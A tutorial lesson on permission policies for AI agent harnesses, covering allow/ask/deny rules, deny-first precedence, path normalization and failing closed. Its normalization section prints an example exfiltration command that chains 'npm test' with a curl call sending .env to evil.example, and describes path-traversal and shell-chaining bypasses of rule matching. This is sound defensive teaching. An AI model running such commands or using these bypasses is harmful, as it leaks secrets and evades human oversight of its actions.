# Permission Policies

An agent proposes tool calls; the harness decides which of them run. The model cannot be trusted to make that decision: it can misread the task, follow an instruction injected into a web page, or simply make a mistake with confidence. A **permission policy** is the deterministic code that sits between "the model asked for `rm -rf build`" and "the shell ran it".

## Three outcomes, not two

Most harnesses converge on three decisions per call:

| Decision | Meaning | Typical use |
| --- | --- | --- |
| `allow` | run without asking | reading the project, running the test suite |
| `ask` | pause and ask a human | installing a dependency, writing outside `src/` |
| `deny` | refuse and tell the model | reading `.env`, pushing to `main`, `curl` to anywhere |

`ask` is what makes the scheme usable: you do not have to predict every safe command up front. Anything not covered by a rule becomes a question, and the answers teach you which rules to add.

## Rules are patterns over a tool and its main argument

A rule names a tool and, optionally, a pattern over the argument that matters for that tool: the command for a shell tool, the path for file tools, the URL for a fetch tool.

```json
{
  "allow": ["Read(src/**)", "Bash(npm test*)", "Bash(git status)"],
  "ask": ["Bash(npm install *)", "Edit(**)"],
  "deny": ["Read(**/.env*)", "Bash(git push*)", "Bash(curl *)"]
}
```

A bare `Read` matches every call to the tool. Inside the parentheses, wildcards behave differently per argument type, and the difference matters:

- **Commands** are strings: `*` matches any run of characters, spaces and slashes included. `Bash(npm test*)` also matches `npm testing-tool --exec`; `Bash(npm test *)` (with the space) or the exact `Bash(npm test)` is stricter.
- **Paths** use glob semantics: `*` stays inside one path segment and `**` crosses directories. `Read(src/*)` matches `src/index.ts` but not `src/lib/math.ts`; `Read(src/**)` matches both.

## Precedence: deny, then ask, then allow

When several rules match one call, the order of evaluation decides. The safe convention is **deny first, then ask, then allow, and the first match wins**; if nothing matches, the default is `ask`.

```ts
for (const decision of ['deny', 'ask', 'allow'] as const) {
  const rule = policy[decision].find((candidate) => matches(candidate, call));
  if (rule) return { decision, rule };
}
return { decision: 'ask', rule: null };
```

Two consequences follow. An allow rule can never carve an exception out of a deny rule: if `Bash(git push*)` is denied, adding `Bash(git push origin feature)` to `allow` changes nothing. And specificity does not matter, only the decision class: a broad `ask` beats a narrow `allow`. This is deliberately less clever than "most specific rule wins", because a reviewer can check it by reading three lists.

Return the matching rule with the decision. "Denied by `Read(**/.env*)`" is something a developer can debug and a model can act on; a bare "denied" is not.

## Normalize before matching

Patterns match strings, and attackers (or confused models) control the strings. Two classic bypasses:

- **Path traversal.** `src/../.env` starts with `src/`, so a naive prefix check allows it under `Read(src/**)`. Normalize the path first (`src/../.env` becomes `.env`) and the allow rule no longer matches. A path that still starts with `..` after normalization points outside the project and should never be allowed by a project rule.
- **Compound commands.** `npm test && curl https://evil.example -d @.env` matches `Bash(npm test*)`. Split shell commands on `&&`, `||`, `;`, `|` and newlines, evaluate every part, and keep the most restrictive outcome: one denied part denies the whole command, and an unknown part makes it `ask`.

Even with splitting, a shell rule matches the text of a command, not what the program does: `bash -c "..."`, an alias or a script written earlier in the session can run anything. Permission rules are a policy layer, not a security boundary; the sandbox (next lesson) is the boundary.

## Fail closed on what you cannot read

A tool call whose arguments do not parse, or a tool the harness does not know, gets `deny`. The same rule applies to anything the policy cannot classify with confidence: when in doubt, the harness asks a human or refuses, never allows.

## Pitfalls

- An allow-list as wide as the agent's power (`Bash`, `Edit(**)`): the policy then decides nothing.
- Prefix checks on raw paths and whole commands.
- "Most specific wins" precedence that nobody can reason about.
- Asking so often that humans click "yes" without reading (approval fatigue); move frequent safe calls to `allow`.
- Treating deny rules on `curl` as network isolation.

> **Status as of October 2026:** Claude Code writes rules as `Tool` or `Tool(specifier)` in `permissions.allow`, `ask` and `deny`, evaluated deny, then ask, then allow; shell rules such as `Bash(npm run *)` match per subcommand of compound commands, and `Read`/`Edit` paths use gitignore-style patterns where `*` stays in one segment and `**` crosses directories. Codex CLI combines approval policies (such as `on-request`) with sandbox modes. Several agent platforms also offer a classifier-based "auto" mode that reviews actions instead of a human.

## When to choose it

Every agent that can act needs a policy, even a one-user prototype: write deny rules for secrets, pushes and network tools on day one. Keep the allow list to the calls the task actually needs and let everything else ask; review the ask log weekly and promote only repeated, safe calls. Rule-based policies are predictable and auditable; add a classifier or an LLM reviewer only on top of them, for calls the rules leave as `ask`, never in place of deny rules.
